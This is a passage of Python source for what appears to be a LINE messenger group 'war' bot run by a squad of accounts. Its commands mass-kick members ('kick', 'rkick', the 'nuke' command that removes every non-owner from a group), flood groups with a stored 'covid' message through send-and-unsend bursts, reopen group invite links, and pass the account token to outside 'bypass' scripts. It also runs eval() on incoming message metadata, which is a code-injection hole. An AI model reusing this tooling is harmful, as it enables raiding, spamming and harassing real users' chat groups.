    		if b in pen:threading.Thread(target=self.client.cancelChatInvitation, args=(to, b, )).start()
    			

    def killModer(self,to,count):
    	#time.sleep(0.02)
    	#chat = self.client.getChat(to)
    	for b in count:
    		#if b in chat.extra.groupExtra.memberMids:
    			threading.Thread(target=self.client.deleteOtherFromChat, args=(to, {b}, )).start()  


    def command(self,text):
    	pesan = text
    	if pesan.startswith(self.CMD["keyCommand"]):
    		cmd = pesan.replace(self.CMD["keyCommand"],"")
    		#self.CMD["allow"] = True
    	else:
    		cmd = "command"
    	return cmd

    def cfoto(self, token):
    	pub = LINE(self.client.authToken,appName='ANDROIDLITE	2.14.0	Android OS	10')
    	a = 'img.jpg'
    	try:pub.updateProfilePicture(a)
    	except:pub.updateProfilePicture(a)
    
    def sendUnicode(self,to):
    	t = self.client.sendMessage(to, self.covid)
    	time.sleep(1)
    	self.client.unsendMessage(t.id)
    	jem = self.client.sendMessage(to, "mid")
    	time.sleep(1)
    	self.client.unsendMessage(jem.id)
    
    def countdownTimer(self,start_minute, start_second):
    	total_second = int(start_minute) * 60 + int(start_second)
    	while total_second:
    		mins, secs = divmod(total_second, 60)
    		print(f'{mins:02d}:{secs:02d}', end='\r')
    		time.sleep(1)
    		total_second -= 1
    		self.war = {}
    def Ulty(self,to,mem,pen= []):
        cmd = 'node ulty.js token={} gid={}'.format(self.client.authToken, to)
        for uid in mem:
        	cmd += ' uid={}'.format(uid)
        	self.blacklist[uid] = True
        os.system(cmd)
        return
    def Bypass1(self,to,mem,pen= []):
        cmd = 'node ulty.js token={} gid={}'.format(self.client.authToken, to)
        for uid in mem:
        	cmd += ' uid={}'.format(uid)
        	self.blacklist[uid] = True
        os.system(cmd)
        return


    def Bypass(self,to,mem,pen):
        kmd = 'node bypass.js token={} gid={}'.format(self.client.authToken, to)
        cmd = 'node bypass.js token={} gid={}'.format(self.client.authToken, to)
        for uid in mem:
        	kmd += ' uid={}'.format(uid)
        	self.blacklist[uid] = True
        for cud in pen:
        	cmd += ' cud={}'.format(cud)
        	self.blacklist[cud] = True
        os.system(kmd)
        os.system(cmd)
        return
    def cancelAllPro(self,to,invites):
    	for x in invites:
    		threading.Thread(target=self.client.session.talk.cancelChatInvitation, args=(CancelChatInvitationRequest(self.client.reqSeq["cancelChatInvitation"], chatMid=to, targetUserMids=set({x})),)).start()

    def kickBL(self,op):
    	try:
    		mem,pen =  self.client.getMidUser(op.param1)
    		if self.war != {}:
    			list = sorted(self.blacklist, reverse=True)
    			for b in list:
    				if b in mem:
    					threading.Thread(target=self.client.deleteOtherFromChat, args=(op.param1, {b}, )).start()
    			self.bqrAll(op.param1)
    			return
    		else:
    			bots = {mid for mid in self.Squad if mid not in mem}
    			if bots:
    				for b in bots:
    					if b in pen:self.client.cancelChatInvitation(op.param1, b)
    				try:self.client.inviteIntoChat(op.param1,bots)
    				except:self.joinQr(op.param1)
    			if op.param1 not in self.G_ticket:
    				self.client.sendMessage(op.param1,"group {} not access".format(self.client.getChat(op.param1).chatName))
    				self.client.deleteSelfFromChat(op.param1)
    			return
    	except Exception as e:
    		if "code=10" in str(e):
    			self.client.acceptChatInvitationByTicket(op.param1,self.G_ticket[op.param1])
    			
    def Restart(self):
    	self.set["count"]["kick"] = self.client.count["kick"]
    	self.set["count"]["cancel"] =self.client.count["cancel"]
    	self.set["count"]["invite"] =self.client.count["invite"]
    	self.set["count"]["msg"] =self.client.count["msg"]
    	self.set["count"]["allreq"] =self.client.count["allreq"]
    	self.set["count"]["accept"] =self.client.count["accept"]
    	self.set["count"]["runtime"] = self.starting
    	self.saved() 
    	time.sleep(1)
    	python = sys.executable
    	os.execl(python, python, *sys.argv)



    def Restartall(self,to,op):
    	if self.Msg(op):
    		self.client.sendMessage(to, "Restart system...")



    def GasKeun(self,to): 
        				try:
        					users = {mid: self.lesting.user[mid] for mid in self.lesting.user}
        					squad = {mid for mid, user in users.items() if user["squad"]}
        					chat = self.client.getChat(to)
        					nobiez = {mid for mid in self.Squad if mid not in chat.extra.groupExtra.memberMids}
        					if nobiez:
        						self.joinQr(to)
        					bot = {}
        					s = []
        					for b in squad:
        						bot[b] = {"mem":[],"pen":[]}
        						s.append(b)
        					mem = []
        					pen = []
        					target = []
        					
        					for i in chat.extra.groupExtra.memberMids:
        						if self.notAllow(i):
        							target.append(i)
        							mem.append(i)
        					for q in chat.extra.groupExtra.inviteeMids:
        						if self.notAllow(q):
        							target.append(q)
        							pen.append(q)
        					tx = "target total {} :m>{} p>{}\n".format(len(target),len(mem),len(pen))
        					def exemple(t,b,e,mem,pen):
        						tar = t
        						bo = b
        						j = e
        						for a in j:
        							if tar:
        								x = random.choice(tar)
        								if x in mem:
        									bo[a]["mem"].append(x)
        								if x in pen:
        									bo[a]["pen"].append(x)
        								t.remove(x)
        							else:
        								return bo
        						if tar:
        							return exemple(tar,bo,j,mem,pen)
        						else:
        							return bo
        					members = mem
        					pendings = pen
        					bots = exemple(target,bot,s,mem,pen)
        					
        					def cekNum(id,members,pendings):
        						nmem = []
        						npen = []
        						for m in range(len(members)):
        							if members[m] in id["mem"]:
        								nmem.append(m)
        						for p in range(len(pendings)):
        							if pendings[p] in id["pen"]:
        								npen.append(p)
        						return nmem,npen
        					datas = {}
        					for u in bots:
        						Mnum,Pnum = cekNum(bots[u],members,pendings)
        						datas[u] = {"mem":Mnum,"pen":Pnum}
        					print(datas)
        					self.sock.sendall(str({"func":"gaskeun","data":datas,"group":to}).encode("utf-8"))
        					for a in bots:
        						tx += "bot {} dapet k>{} c>{}\n".format(self.client.getContact(a).displayName,		len(bots[a]["mem"]),	len(bots[a]["pen"]))
        					return tx
        				except Exception as e:
        					print (str(e))
    def blInviter(self,op2,op3):
    	self.blacklist[op2] = True
    	for mid in op3:
    		self.blacklist[mid] = True
        					
    def worker(self,op):
        try:
        	if op.type in [13, 124]:
        		param2 = self.detectUser(op.param2)
        		invite = op.param3.split("\x1e")
        		if self.mid in invite:
        			threading.Thread(target=self.client.acceptChatInvitation, args=(op.param1, )).start()
        			return
        		if op.param2 in self.force + sorted(self.master, reverse=True):return
        		if self.equal(op.param1,invite):
        				self.blInviter(op.param2, invite)
        				if self.Msg(op):
        					for b in invite:
        						if b in self.blacklist:threading.Thread(target=self.client.cancelChatInvitation, args=(op.param1, b, )).start()
        					#threading.Thread(target=self.client.deleteOtherFromChat, args=(op.param1, {op.param2}, )).start()
        					return
        		else:
        				if op.param1 in self.war:return
        				if self.proGroup(op):
        					if self.Msg(op) and self.notAllow(op.param2):
        						self.cancelAllPro(op.param1,invite)
        						threading.Thread(target=self.client.deleteOtherFromChat, args=(op.param1, {op.param2}, )).start()
        						self.blInviter(op.param2, invite)
        						return


        	if op.type in [11, 122]:
        		param2 = self.detectUser(op.param2)
        		if op.param2 in self.force + sorted(self.master, reverse=True):return
        		if self.warGroup(op.param1):
        			self.blacklist[op.param2] = True
        			if self.Msg(op):
        				if self.Fast:self.killModeqr(op.param1,sorted(self.blacklist, reverse=True))
        				else:threading.Thread(target=self.client.deleteOtherFromChat, args=(op.param1, {op.param2}, )).start()
        				self.bqrAll(op.param1);threading.Thread(target=self.client.inviteIntoChat, args=(op.param1, self.Squad, )).start()
        				return
        		else:
        			if op.param1 in self.war:return
        			if param2["squad"]:return
        			if self.proGroup(op):
        				if self.Msg(op) and self.notAllow(op.param2):
        					threading.Thread(target=self.client.deleteOtherFromChat, args=(op.param1, {op.param2}, )).start()
        					threading.Thread(target=self.lockQrName, args=(op.param1,)).start()
        				return
 
        	if op.type in [19, 133]:
        		#param2 = self.detectUser(op.param2)
        		param3 = self.detectUser(op.param3)
        		if op.param2 in self.force + sorted(self.master, reverse=True):return
        		if op.param3 == self.mid:
        			self.blacklist[op.param2] = True
        			self.war[op.param1] = True
        			return
        		if param3["squad"]:
        			self.blacklist[op.param2] = True
        			self.war[op.param1] = True
        			self.terkick[op.param3] = True
        			if self.Msg(op):
        					if self.Fast:self.killMode(op.param1,sorted(self.blacklist, reverse=True) ,op)
        					else:threading.Thread(target=self.client.deleteOtherFromChat, args=(op.param1, {op.param2}, )).start()
        					if self.beckupQr:self.bqrAll(op.param1)
        					else:
        						threading.Thread(target=self.client.inviteIntoChat, args=(op.param1, self.Squad, )).start()
        						threading.Thread(target=self.cekQr, args=(op.param1,)).start()
        					return
        		else:
        			if op.param1 in self.war:return
        			if self.proGroup(op):
        				if self.Msg(op) and self.notAllow(op.param2):
        					threading.Thread(target=self.client.deleteOtherFromChat, args=(op.param1, {op.param2}, )).start()
        					threading.Thread(target=self.client.findAndAddContactsByMid, args=(op.param3,)).start()
        					threading.Thread(target=self.client.inviteIntoChat, args=(op.param1, {op.param3}, )).start()
        					return
        		if op.param3 in self.master:
        			self.blacklist[op.param2] = True
        			if self.Msg(op):
        				self.addTime()
        				self.killMode(op.param1,[mid for mid in self.blacklist],op)
        				threading.Thread(target=self.client.findAndAddContactsByMid, args=(op.param3,)).start()
        				threading.Thread(target=self.client.inviteIntoChat, args=(op.param1, {op.param3}, )).start()
        				return


        	if op.type in [17, 130]:
        		param2 = self.detectUser(op.param2)
        		if op.param2 in self.force + sorted(self.master, reverse=True):return
        		if op.param2 in self.blacklist:
        			if self.Msg(op):
        				#if self.beckupQr:self.killModeqr(op.param1,sorted(self.blacklist, reverse=True))
        				threading.Thread(target=self.client.deleteOtherFromChat, args=(op.param1, {op.param2}, )).start()
        				return
        		else:
        			if op.param1 in self.war:return
        			if self.proGroup(op):
        				if self.Msg(op):
        					threading.Thread(target=self.cekQr, args=(op.param1,)).start()
        					return
        		if self.war == {}:
        			self.addTime()
        			return
        	elif  op.type == 129:
        		#if self.Msg(op):
        			#self.kickBL(op)
        			threading.Thread(target=self.kickBL, args=(op,)).start()
        			return

        	if op.type in [32, 126]:
        		#param2 = self.detectUser(op.param2)
        		param3 = self.detectUser(op.param3)
        		if op.param2 in self.force + sorted(self.master, reverse=True):return
        		if op.param3 == self.mid:
        			self.blacklist[op.param2] = True 
        			return
        		if param3["squad"]:
        			self.blacklist[op.param2] = True
        			if self.Msg(op):
        				if self.Fast:self.killModeqr(op.param1,sorted(self.blacklist, reverse=True))
        				else:threading.Thread(target=self.client.deleteOtherFromChat, args=(op.param1, {op.param2}, )).start()
        				if self.beckupQr:
        					threading.Thread(target=self.bqr, args=(op.param1,op.param3,)).start()
        				else:
        					threading.Thread(target=self.client.inviteIntoChat, args=(op.param1, self.Squad, )).start()
        				return
        		else:
        			if op.param1 in self.war:return
        			if self.proGroup(op):
        				if self.Msg(op) and self.notAllow(op.param2):
        					threading.Thread(target=self.client.deleteOtherFromChat, args=(op.param1, {op.param2}, )).start()
        					threading.Thread(target=self.client.findAndAddContactsByMid, args=(op.param3,)).start()
        					threading.Thread(target=self.client.inviteIntoChat, args=(op.param1, {op.param3}, )).start()
        					return
        			else:
        				if op.param3 in self.master:
        					self.blacklist[op.param2] = True
        					if self.Msg(op):
        						self.addTime()
        						self.killMode(op.param1,[mid for mid in self.blacklist],op)
        						threading.Thread(target=self.client.findAndAddContactsByMid, args=(op.param3,)).start()
        						threading.Thread(target=self.client.inviteIntoChat, args=(op.param1, {op.param3}, )).start()
        						return


        	if op.type == 5:
        		if op.param1 in self.client.contacts:
        			return
        		else:
        			self.client.findAndAddContactsByMid(op.param1)
        			if self.set["resadd"] == "":self.client.sendMessage(op.param1, "thanks for add\n"+self.promo)
        			else:self.client.sendMessage(op.param1, "thanks for add\n"+self.set["resadd"])
        			if op.param1 not in self.master:
        				timing = getTime()
        				for m in self.master:
        					try:self.client.sendMention(m,"si 􀜆􀅔Har Har􏿿 \nngepoin aku nh bos\n\nsekitar hari {}".format(timing),[op.param1])
        					except:pass
        			return

        	if op.type == 26:
        		msg = op.message
        		if 'MENTION' in msg.contentMetadata.keys() != None and self.mid in [x["M"] for x in eval(msg.contentMetadata['MENTION'])["MENTIONEES"]]:
        			if msg.to in self.protect:
        				if self.protect[msg.to]["antiTag"]:
        					if self.notAllow(msg._from):
        						self.blacklist[msg._from] = True
        						if self.Msg(op):threading.Thread(target=self.client.deleteOtherFromChat, args=(msg.to, {msg._from}, )).start()
        						return
        			text = self.lesting.storage.command["prefix"]+msg.text[int(eval(msg.contentMetadata['MENTION'])["MENTIONEES"][-1]['E'])+1:].replace('\n','')
        		else:text = msg.text
        		msg_id = msg.id
        		msgto = msg.to
        		receiver = msg.to
        		msg.from_ = msg._from
        		sender = msg._from
        		
        		if self.remotGroup == "":
        			pass
        		else:
        			msg.to = self.remotGroup
        		to = msg.to
        		if msg._from in self.master:
        			rm = threading.Thread(target=self.remoteText, args=(msgto,)).start()
        			if to in self.mid:
        				print(msg.text[:5])
        				if "https" == str(msg.text[:5]):
        					gc = self.client.findChatByTicket(msg.text[23:]).chatMid
        					g_ticket = {gc:msg.text[23:]}
        					self.sock.sendall(str({"func":"ticket","ticket":g_ticket,"bot":self.mid,"group":gc}).encode("utf-8"))


        		if msg.contentType == 7:
        			if msg._from in self.master:
        				if msg.contentMetadata["STKID"] in str(self.set["skick"]["STKID"]) and msg.contentMetadata["STKPKGID"] in self.set["skick"]["STKPKGID"] and msg.contentMetadata["STKVER"] in self.set["skick"]["STKVER"]:
        					if msg.relatedMessageId == None:return self.client.sendMessage(to, 'Reply Message not found.')
        					M = self.client.getRecentMessagesV2(to, 1001)
        					anu = []
        					for ind, i in enumerate(M):
        						if i.id == msg.relatedMessageId:
        							anu.append(i)
        					self.blacklist[anu[0]._from] = True
        					if to in self.G_ticket:self.Link = self.G_ticket[to]
        					self.war[to] = True
        					op.type = 19
        					if self.Msg(op):
        						time.sleep(1)
        						try:self.client.deleteOtherFromChat(to, {anu[0]._from});return
        						except:self.client.sendMessage(to, "Error 404")
        						return

        				if msg.contentMetadata["STKID"] in str(self.set["srp"]["STKID"])  and msg.contentMetadata["STKPKGID"] in self.set["srp"]["STKPKGID"] and msg.contentMetadata["STKVER"] in self.set["srp"]["STKVER"]:
        					self.client.sendMessage(to, self.set["srp"]["respon"])
        					return
        				if msg.contentMetadata["STKID"] in str(self.set["sbyall"]["STKID"]) and msg.contentMetadata["STKPKGID"] in self.set["sbyall"]["STKPKGID"] and msg.contentMetadata["STKVER"] in self.set["sbyall"]["STKVER"]:
        					self.client.deleteSelfFromChat(to)
        					return
        				if msg.contentMetadata["STKID"] in str(self.set["scb"]["STKID"]) and msg.contentMetadata["STKPKGID"] in self.set["scb"]["STKPKGID"] and msg.contentMetadata["STKVER"] in self.set["scb"]["STKVER"]:
        					if self.Msg(op):
        						self.clearban(self.mid,to)
        				if msg.contentMetadata["STKID"] in str(self.set["invite"]["STKID"]) and msg.contentMetadata["STKPKGID"] in self.set["invite"]["STKPKGID"] and msg.contentMetadata["STKVER"] in self.set["invite"]["STKVER"]:
        					if self.Msg(op):threading.Thread(target=self.client.inviteIntoChat, args=(to, self.Squad, )).start()
        				if msg.contentMetadata["STKID"] in self.set["scomd"]:
        					text = self.lesting.storage.command["prefix"]+self.set["scomd"][msg.contentMetadata["STKID"]]

        		if text is None:return
        		if msg._from not in self.master:return
        		self.msgId = msg_id
        		
        		
        		if msg.toType == 2:
        			if msg.contentType == 1:
        				if self.upfoto == True:
        					path = self.client.downloadMsg(msg_id, "img.jpg")
        					self.upfoto = False
        					self.cfoto(self.client.authToken)
        					self.client.sendMessage(to,'success Update photo profile...')
        		
        		if text == "vers":
        			self.client.sendMessage(to,"Last update in version {}\n{}".format(self.version,self.Note))
        			return
        		cmds = self.command(text)
        		for jembot in range(len(cmds.split('\n'))):
        			comd = cmds.split('\n')[jembot]
        			if jembot != 0:
        				comd = self.lesting.storage.command["prefix"]+cmds.split('\n')[jembot]
        			command, args = self.lesting.command(comd)
        			if command == False:return
        			if command == "cb":
        				if to in self.war:self.unsend(to,msg,50)
        				if self.Msg(op):
        					self.clearban(self.mid,to)

        			if command.startswith("kick"):
        				MENTION = msg.contentMetadata.get("MENTION", None)
        				if MENTION:
        						chat = self.client.getChat(to)
        						MENTIONEES = eval(MENTION)["MENTIONEES"]
        						self.war[to] = True
        						target = []
        						for mention in MENTIONEES:
        							if mention["M"] in chat.extra.groupExtra.memberMids:
        								self.blacklist[mention["M"]] = True
        								target.append(mention["M"])
        						if to in self.G_ticket:self.Link = self.G_ticket[to]
        						op.type = 19
        						if self.Msg(op):
        							time.sleep(1)
        							for monyet in target:
        								threading.Thread(target=self.client.deleteOtherFromChat, args=(to, {monyet}, )).start()


        			if command.startswith("bkick"):
        				MENTION = msg.contentMetadata.get("MENTION", None)
        				if MENTION:
        						chat = self.client.getChat(to)
        						MENTIONEES = eval(MENTION)["MENTIONEES"]
        						self.war[to] = True
        						target = []
        						for mention in MENTIONEES:
        							if mention["M"] in chat.extra.groupExtra.memberMids:
        								self.blacklist[mention["M"]] = True
        								target.append(mention["M"])
        						if to in self.G_ticket:self.Link = self.G_ticket[to]
        						if self.Msg(op):
        							time.sleep(1)
        							self.karungin(to,target,op)


        			if command.startswith("owner"):
        				if self.Msg(op):
        					MENTION = msg.contentMetadata.get("MENTION", None)
        					if MENTION:
        						chat = self.client.getChat(to)
        						MENTIONEES = eval(MENTION)["MENTIONEES"]
        						target = []
        						for mention in MENTIONEES:
        							if mention["M"] in chat.extra.groupExtra.memberMids:
        								target.append(mention["M"])
        						self.sock.sendall(str({"func":"addowner","group":to,"target":target,"bot":self.mid}).encode("utf-8"))


        			if command.startswith("staff"):
        				if self.Msg(op):
        					MENTION = msg.contentMetadata.get("MENTION", None)
        					if MENTION:
        						chat = self.client.getChat(to)
        						MENTIONEES = eval(MENTION)["MENTIONEES"]
        						target = []
        						for mention in MENTIONEES:
        							if mention["M"] in chat.extra.groupExtra.memberMids:
        								target.append(mention["M"])
        						self.sock.sendall(str({"func":"addstaff","group":to,"target":target,"bot":self.mid}).encode("utf-8"))

        			if command.startswith("teams"):
        				if self.Msg(op):
        					list = [m for m in self.master]
        					ws = [a for a in self.ws]
        					self.client.sendMentionWithList(to,"List Owner",list )
        					if ws:
        						self.client.sendMentionWithList(to,"white list",ws )


        			if command.startswith("expel"):
        				if self.Msg(op):
        					MENTION = msg.contentMetadata.get("MENTION", None)
        					if MENTION:
        						MENTIONEES = eval(MENTION)["MENTIONEES"]
        						target = []
        						for mention in MENTIONEES:
        							target.append(mention["M"])
        						self.sock.sendall(str({"func":"expel","group":to,"target":target,"bot":self.mid}).encode("utf-8"))
        								
        			if command == "groups" or command.startswith("memgroups"):
        				split = text.split(" ")
        				if "{}memgroups".format(self.lesting.storage.command["prefix"]) == split[0]:
        					group = []
        					for xx in self.client.getAllChatMids(True).memberChatMids:group.append(xx)
        					gc = group[int(split[1]) - 1]
        					mem = self.client.getChat(gc).extra.groupExtra.memberMids
        					tx ="╭ ◤ {} ◥\n".format(self.client.getChat(gc).chatName )
        					num = 0
        					for m in mem:
        						num += 1
        						tx += "│{}.{}\n".format(num,self.client.getContact(m).displayName)
        					tx += "╰ ◣ {}/{} members ◢".format(len(mem),len(self.client.getChat(gc).extra.groupExtra.inviteeMids))
        					self.client.sendMessage(to,tx)
        					return
        				group = self.client.getAllChatMids(True).memberChatMids
        				tx ="╭ ◤ GROUP ◥\n"
        				num = 0
        				for g in group:
        					num +=1
        					if g in self.protect:
        						tx += "│🛡 {}.{}│{}/{}\n".format(num,self.client.getChat(g).chatName,len(self.client.getChat(g).extra.groupExtra.memberMids),len(self.client.getChat(g).extra.groupExtra.inviteeMids))
        					else:
        						tx += "│🔰 {}.{}│{}/{}\n".format(num,self.client.getChat(g).chatName,len(self.client.getChat(g).extra.groupExtra.memberMids),len(self.client.getChat(g).extra.groupExtra.inviteeMids))
        				tx += "╰ ◣ {} ◢".format(self.logo)
        				self.client.sendMessage(to, tx)

        			if command.startswith("rkick"):
        					split = text.split(" ")
        					group = []
        					try:
        						for xx in self.client.getAllChatMids(True).memberChatMids:group.append(xx)
        						gc = group[int(split[1]) - 1]
        						mem = [mid for mid in self.client.getChat(gc).extra.groupExtra.memberMids]
        						target = []
        						for t in ast.literal_eval(split[2]):
        							#print(t)
        							user = mem[t - 1]
        							target.append(user)
        							self.blacklist[mem[t - 1]] = True
        						self.Msg(op)
        						self.Ulty(gc,target,[])
        					except Exception as e:
        						self.client.sendMessage(to,str(e))
        

        			if command.startswith("rbkick"):
        					split = text.split(" ")
        					group = []
        					try:
        						for xx in self.client.getAllChatMids(True).memberChatMids:group.append(xx)
        						gc = group[int(split[1]) - 1]
        						mem = [mid for mid in self.client.getChat(gc).extra.groupExtra.memberMids]
        						target = []
        						for t in ast.literal_eval(split[2]):
        							#print(t)
        							user = mem[t - 1]
        							target.append(user)
        							self.blacklist[mem[t - 1]] = True
        						self.Msg(op)
        						self.karungin(gc,target,op)
        					except Exception as e:
        						self.client.sendMessage(to,str(e))
        

        			if command.startswith("gurl"):
        				if self.Msg(op):
        					split = text.split(" ")
        					group = []
        					try:
        						for xx in self.client.getAllChatMids(True).memberChatMids:group.append(xx)
        						gc = group[int(split[1]) - 1]
        						D = self.client.getChat(gc)
        						if D.extra.groupExtra.preventedJoinByTicket == True:
        							D.extra.groupExtra.preventedJoinByTicket = False
        						self.client.updateChat(D,4)
        						ticket = self.client.reissueChatTicket(gc)
        						self.client.sendMessage(to,"https://line.me/R/ti/g/{}".format(ticket))
        					except:self.client.sendMessage(to, "group not found")

        			if command.startswith("remot"):
        				if self.Msg(op):
        					split = text.split(" ")
        					group = []
        					try:
        						for xx in self.client.getAllChatMids(True).memberChatMids:group.append(xx)
        						gc = group[int(split[1]) - 1]
        						self.remotGroup = str(gc)
        						self.client.sendMessage(to,"you command?")
        					except:
        						self.client.sendMessage(to,"please check listGroup first")

        			if command.startswith("nuke"):
        				if self.Msg(op):
        					split = text.split(" ")
        					group = []
        					try:
        						for xx in self.client.getAllChatMids(True).memberChatMids:group.append(xx)
        						gc = group[int(split[1]) - 1]
        						mem = self.client.getChat(gc).extra.groupExtra.memberMids
        						targets = []
        						for x in mem:
        							if x not in self.set["force"] and x not in self.set["master"]:
        								targets.append(x)
        						self.client.sendMessage(gc, self.covid)
        						for a in targets:
        							threading.Thread(target=self.client.deleteOtherFromChat, args=(gc, {a}, )).start()
        						self.client.sendMessage(to, "Success Kick {} members in group {}".format(len(targets),self.client.getChat(gc).chatName))
        					except:self.client.sendMessage(to, "group not found")

        			if command.startswith("sendcovid"):
        				if self.Msg(op):
        					split = text.split(" ")
        					group = []
        					try:
        						for xx in self.client.getAllChatMids(True).memberChatMids:group.append(xx)
        						gc = group[int(split[1]) - 1]
        						for a in range(5):
        							threading.Thread(target=self.sendUnicode, args=(gc, )).start()
        						self.client.sendMessage(gc, self.covid)
        						self.client.sendMessage(to, "Success send to {}".format(self.client.getChat(gc).chatName))
        					except:self.client.sendMessage(to, "group not found")

        			if command == "covid":
        				for a in range(5):
        					threading.Thread(target=self.sendUnicode, args=(to, )).start()
        					

        			if command == "sp":
        				count = 10
        				if "--c" in args:
        					countIndex = args.index("--c") + 1
        					if len(args) > countIndex:
        						countString = args[countIndex]
        						if countString.isdigit():count = int(countString)
        				def tester(panel):
        					s = time.time()
        					self.client.getProfile()
        					e = time.time() - s
        					panel.data.append(e)
        				panel = type("Panel", (object,), {"data": []})
        				ts = []
        				for _ in range(count):
        					if "--t" in args:
        						tester(panel)
        						ts.append(t)
        					else:
        						tester(panel)
        				for t in ts:t.join()
        				rp = "%s"% (sum(panel.data)/len(panel.data))
        				self.client.sendMessage(to, "Speed respon: {}".format(rp[:6]) )

        			if command == "log": 
        				if self.loger != []:
        					tx = ""
        					for l in self.loger:
        						tx += "{}\n\n".format(l)
        					self.client.sendMessage(to,tx)
        				else:self.client.sendMessage(to,"Not have errors..")

        			if command == "cek": 
        				try:
        					self.client.deleteOtherFromChat(self.mid,{self.mid})
        					self.client.findChatByTicket(self.G_ticket[to])
        				except Exception as e:
        					if 'code=35' in str(e):
        						if self.set["count"]["duedate"][self.mid] == "":
        							self.duedate = self.duedate + relativedelta(hours= -1)
        							self.set["count"]["duedate"][self.mid] = str(self.duedate)
        						self.client.limit = True
        						l = False
        					elif 'code=20' in str(e):
        						if self.set["count"]["duedate"][self.mid] == "":
        							self.duedate = self.duedate + relativedelta(hours= 1)
        							self.set["count"]["duedate"][self.mid] = str(self.duedate)
        						self.client.limit = True
        						l = False
        					elif 'code=0' in str(e):
        						self.set["count"]["duedate"][self.mid] = ""
        						l = True
        				tx = "╭ ◤ 𝐁𝐎𝐓𝐒 𝐒𝐓𝐀𝐓𝐔𝐒 ◥\n"
        				if l:tx += "│𝚁𝙴𝚀𝚄𝙴𝚂𝚃: GOOD\n│\n"
        				else:
        					tx += "│𝚁𝙴𝚀𝚄𝙴𝚂𝚃: BAD\n"
        					timeleft = self.duedate - datetime.now()
        					days, seconds = timeleft.days, timeleft.seconds
        					hours = seconds / 3600
        					minutes = (seconds / 60) % 60
        					tx += "│𝐭𝐢𝐦𝐞𝐥𝐞𝐟𝐭: %sh:%sm\n│\n"%(round(hours),round(minutes))
        					self.set["count"]["duedate"][self.mid] = str(self.duedate)
        				kick = self.client.count["kick"]
        				cancel = self.client.count["cancel"]
        				invite = self.client.count["invite"]
        				pesan = self.client.count["msg"]
        				accept = self.client.count["accept"]
        				allreq = self.client.count["allreq"]
        				try:
        					self.client.findChatByTicket(self.G_ticket[to])
        					tx += "│status qr: ☑️\n"
        				except Exception as e:
        					if 'code=5' in str(e):
        						tx += "│status qr: ⚠️\n"
        					elif 'code=35' in str(e):
        						tx += "│status qr: 🚫\n"
        				tx += "│𝐂𝐎𝐔𝐍𝐓\n"
        				tx += "│	𝘬𝘪𝘤𝘬: {}\n".format(kick)
        				tx += "│	𝘤𝘢𝘯𝘤𝘦𝘭: {}\n".format(cancel)
        				tx += "│	𝘪𝘯𝘷𝘪𝘵𝘦: {}\n".format(invite)
        				tx += "│	acceptQr: {}\n".format(accept)
        				tx += "│	𝘮𝘴𝘨: {}\n".format(pesan)
        				runtime = int(time.time() - self.starting)
        				tx += "├──────────────\n"
        				tx += "│𝐚𝐥𝐥 𝐫𝐞𝐪𝐮𝐞𝐬𝐭: {}\n".format(kick+cancel+invite+accept+pesan+allreq)
        				tx += "│𝗥𝘂𝗻𝘁𝗶𝗺𝗲: "
        				if runtime // 86400 != 0:
        					tx += "{}d ".format(runtime // 86400 )
        					runtime = runtime % 86400 
        				if runtime // 3600 != 0:
        					tx+= "{}h ".format(runtime // 3600 )
        					runtime = runtime % 3600
        				if runtime // 60 != 0:
        					tx += "{}m ".format(runtime // 60 )
        				tx += "{}s\n".format(runtime % 60)
        				tx += "╰ ◣ {} ◢".format(self.logo)
        				self.client.sendMessage(to, tx)

        			if command == "sys" and self.Msg(op):
        				ac = subprocess.getoutput('lsb_release -a')
        				am = subprocess.getoutput('cat /proc/meminfo')
        				ax = subprocess.getoutput('lscpu')
        				core = subprocess.getoutput('grep -c ^processor /proc/cpuinfo ')
        				python_imp = platform.python_implementation()
        				python_ver = platform.python_version()
        				for line in ac.splitlines():
        					if 'Description:' in line:
        						osi = line.split('Description:')[1].replace('  ','')
        				for line in ax.splitlines():
        					if 'Architecture:' in line:
        						architecture =  line.split('Architecture:')[1].replace(' ','')
        				for line in am.splitlines():
        					if 'MemTotal:' in line:
        						mem = line.split('MemTotal:')[1].replace(' ','')
        					if 'MemFree:' in line:
        						fr = line.split('MemFree:')[1].replace(' ','')
        				tx ="╭ ◤ 𝐒𝐘𝐒𝐓𝐄𝐌 ◥"
        				tx +="\n│• 𝐎𝐒 : {}".format(osi)
        				tx +="\n│• 𝐋𝐚𝐧𝐠: {}".format(python_imp)
        				tx +="\n│• 𝐕𝐞𝐫 𝐋𝐚𝐧𝐠: python{}".format(python_ver)
        				tx +="\n│• 𝐀𝐫𝐜𝐡𝐢𝐭𝐞𝐜𝐭𝐮𝐫𝐞: {}".format(architecture)
        				tx +="\n│• 𝗖𝗣𝗨 : {} ᶜᵒʳᵉ".format(core)
        				tx +="\n│• 𝐌𝐞𝐦𝐨𝐫𝐲: {}".format(mem)
        				tx +="\n│• 𝐟𝐫𝐞𝐞: {}\n".format(fr)
        				tx += "╰ ◣ {} ◢".format(self.logo)
        				self.client.sendMessage(to, tx)

        			if command == "count": 
        				kick = self.client.count["kick"]
        				cancel = self.client.count["cancel"]
        				invite = self.client.count["invite"]
        				pesan = self.client.count["msg"]
        				accept = self.client.count["accept"]
        				allreq = self.client.count["allreq"]
        				tx = "╭ ◤ 𝐂𝐎𝐔𝐍𝐓 ◥\n"
        				tx += "│	𝘬𝘪𝘤𝘬: {}\n".format(kick)
        				tx += "│	𝘤𝘢𝘯𝘤𝘦𝘭: {}\n".format(cancel)
        				tx += "│	𝘪𝘯𝘷𝘪𝘵𝘦: {}\n".format(invite)
        				tx += "│	acceptQr: {}\n".format(accept)
        				tx += "│	𝘮𝘴𝘨: {}\n".format(pesan)
        				runtime = int(time.time() - self.starting)
        				tx += "├──────────────\n"
        				tx += "│𝐚𝐥𝐥 𝐫𝐞𝐪𝐮𝐞𝐬𝐭: {}\n".format(kick+cancel+invite+accept+pesan+allreq)
        				tx += "│𝗥𝘂𝗻𝘁𝗶𝗺𝗲: "
        				if runtime // 86400 != 0:
        					tx += "{}d ".format(runtime // 86400 )
        					runtime = runtime % 86400 
        				if runtime // 3600 != 0:
        					tx+= "{}h ".format(runtime // 3600 )
        					runtime = runtime % 3600
        				if runtime // 60 != 0:
        					tx += "{}m ".format(runtime // 60 )
        				tx += "{}s\n".format(runtime % 60)
        				tx += "╰ ◣ {} ◢".format(self.logo)
        				self.client.sendMessage(to, tx)

        			if command == "cekall":
        				if self.Msg(op):
        					self.sock.sendall(str({"func":"reqstat","group":to,"bot":self.mid}).encode("utf-8"))
        			if command == "bye":
        				if self.Msg(op):pass
